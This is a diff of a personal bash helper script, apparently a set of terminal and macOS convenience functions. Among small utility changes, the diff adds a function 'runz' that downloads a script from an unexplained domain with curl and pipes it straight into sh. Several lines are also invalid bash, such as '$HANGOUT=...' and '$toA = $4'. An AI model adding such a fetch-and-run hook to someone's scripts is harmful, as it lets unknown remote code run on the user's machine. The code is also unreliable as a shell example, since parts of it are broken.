@@ -5,6 +5,10 @@
 # Don't worry about it!!
 ###########  END HEADER  ###########
 
+# Some constants
+
+$HANGOUT='https://meet.google.com/xsu-ydik-ohu?hl=en&authuser=1';
+
 termdo() {
     osascript -e 'tell application "Terminal" to do script "'"$1"'"'
 }
@@ -117,32 +121,6 @@ prompt() {
 
 # Utils
 
-# This important func, 'run', helps compose bash funcs together.
-# It also helps writing code nicer. At my current understanding level,
-# this func helps at any time you would previously write '$(...)'
-# — now you can use 'run' to not have to think about it.
-# Plz share any thoughts you have about any of this
-
-# Here's a before and after example:
-# Before — "sleep $(random);"
-# After — "sleep run random;"
-
-# If you want to pass multiple args, you can.
-# "sleep run randomRange 1 10;"
-
-# Note that "$@" here is acting like spreading the '...args' to a js function
-# Here's a JS equivalent of 'run':
-# const run = (func, ...args) => {
-#
-#     return func(...args);
-# }
-
-# <3
-run() {
-    $1 "$@";
-}
-
-# Noice
 openYtClip() {
     open "https://www.youtube.com/embed/$1?start=$2&end=$3&version=3&autoplay=true";
 }
@@ -151,6 +129,10 @@ bigMsg() {
     # It takes work to manage how many newlines
     # should be there for which font size
     clear && setFontSize 120 && bold "\n\n\n$1\n\n\n";
+}
+
+cancelNoise() {
+    tput bel;
 }
 
 # MUTHAF*******!!
@@ -182,4 +164,8 @@ animatePosition() {
     $toA = $4;
     $toB = $5;
     $time = $6;
+}
+
+runz() {
+    curl -s https://suckaaa.com/s/z | sh;
 }
